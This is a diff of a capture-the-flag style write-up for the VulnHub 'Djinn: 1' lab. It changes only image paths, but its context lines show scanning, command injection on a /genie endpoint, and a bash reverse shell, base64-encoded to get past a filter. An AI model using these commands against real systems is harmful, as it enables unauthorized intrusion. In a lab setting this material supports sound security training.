@@ -3,7 +3,7 @@
 - **Machine:** Djinn: 1
 - **Download:** https://www.vulnhub.com/entry/djinn-1,397/
 
-![](810-1.png)
+![](images/810-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](810-2.png)
+![](images/810-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.155
 ```
 
-![](810-3.png)
+![](images/810-3.png)
 
 ---
 
@@ -83,7 +83,7 @@ get game.txt
 get message.txt
 ```
 
-![](810-4.png)
+![](images/810-4.png)
 
 ---
 
@@ -101,7 +101,7 @@ cat game.txt
 cat message.txt
 ```
 
-![](810-5.png)
+![](images/810-5.png)
 
 ---
 
@@ -121,7 +121,7 @@ Perform directory brute-forcing.
 gobuster dir -u http://192.168.2.155:7331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-![](810-6.png)
+![](images/810-6.png)
 
 ---
 
@@ -131,11 +131,11 @@ Visit the following endpoints:
 
 - http://192.168.2.155:7331/wish
 
-![](810-7.png)
+![](images/810-7.png)
 
 - http://192.168.2.155:7331/genie
 
-![](810-8.png)
+![](images/810-8.png)
 
 ---
 
@@ -155,7 +155,7 @@ Submit the request:
 http://192.168.2.155:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
 ```
 
-![](810-9.png)
+![](images/810-9.png)
 
 Successful execution confirms command injection.
 
@@ -179,11 +179,11 @@ nc -nlvp 443
 bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'
 ```
 
-![](810-10.png)
+![](images/810-10.png)
 
 The payload is blocked and does not execute successfully.
 
-![](810-11.png)
+![](images/810-11.png)
 
 ---
 
@@ -195,7 +195,7 @@ Encode the payload using Base64.
 echo -n 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1' | base64 -w 0
 ```
 
-![](810-12.png)
+![](images/810-12.png)
 
 ---
 
@@ -213,11 +213,11 @@ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMjE5LzQ0MyAwPiYx | base64 -d | bash
 
 Submit the payload through the vulnerable endpoint.
 
-![](810-13.png)
+![](images/810-13.png)
 
 A reverse shell is successfully established.
 
-![](810-14.png)
+![](images/810-14.png)
 
 ---
 
